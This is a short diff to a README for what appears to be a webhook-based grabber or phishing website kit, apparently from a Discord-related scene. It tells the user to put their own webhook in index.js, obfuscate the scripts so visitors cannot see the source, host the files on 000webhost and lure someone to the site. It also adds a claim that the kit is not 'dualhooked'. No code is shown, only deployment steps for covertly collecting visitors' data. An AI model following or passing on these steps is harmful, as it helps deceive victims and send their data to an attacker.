@@ -1,5 +1,6 @@
-this was made by sigma#4268 aka xyz#7000
+made by sigma#4268 aka xyz#7000
 i just changed my tag
+also this isnt dualhooked. it's open sourced and you can look through the sources of all website in the files.
 
 anyways just edit index.js and then change your webhook
 
@@ -7,7 +8,7 @@ and then save
 
 now goto 000webhost and make a webiste and goto file manager
 I recommend to obfuscate index.js and index.css so the user can't see the source code. You can use free css and js obfuscators online
-upload index.html, index.js, style.css in and save and close
+upload index.html, index.js, style.css in file manager and save and close
 now just ask someone to goto ur website.
 done
 
